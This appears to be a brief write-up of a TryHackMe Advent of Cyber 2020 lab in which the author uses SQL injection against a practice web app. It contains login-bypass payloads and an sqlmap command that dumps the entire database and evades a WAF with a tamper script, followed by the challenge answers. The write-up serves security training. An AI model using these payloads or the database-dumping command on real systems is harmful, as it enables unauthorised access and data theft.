---
title: "TryHackMe Advent of Cyber 2020 Day 5"
date: 2021-12-05
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2020"
event_day: "Day 5"
permalink: "/writeups/advent-of-cyber/25days-of-cybersecurity-day-5/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2020
  - day-5
---

# AoC Day5

nmap
```text
22
3000	http
3306	mysql
8000	http
```

```text
1' AND 1=1 --+
```

```text
Santa reads some documentation that he wrote when setting up the application, it reads:

"Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using --tamper=space2comment"

here we know --dbms = sqlite and use --tamper=space2comment for WAF
```

```text
after bypass santapanel -via ' OR 1=1 --+
catch the request using brupsuit and save (as panel-resquest)

sqlmap -r panel-request --dbms sqlite --dump-all --tamper=space2comment
```

## Task

- Without using directory brute forcing, what's Santa's secret login panel?
```text
/santapanel	-via HINT & guessing  {tried gobuster but no result :D}
```

- Visit Santa's secret login panel and bypass the login using SQLi
```text
username : ' OR 1=1 --+
password : ' OR 1=1 --+
```

- How many entries are there in the gift database?
```text
22
```

- What did Paul ask for?
```text
Github Ownership
```

- What is the flag?
```text
[redacted challenge flag]
```

- What is the admin's password?
```text
[redacted sensitive answer]
```
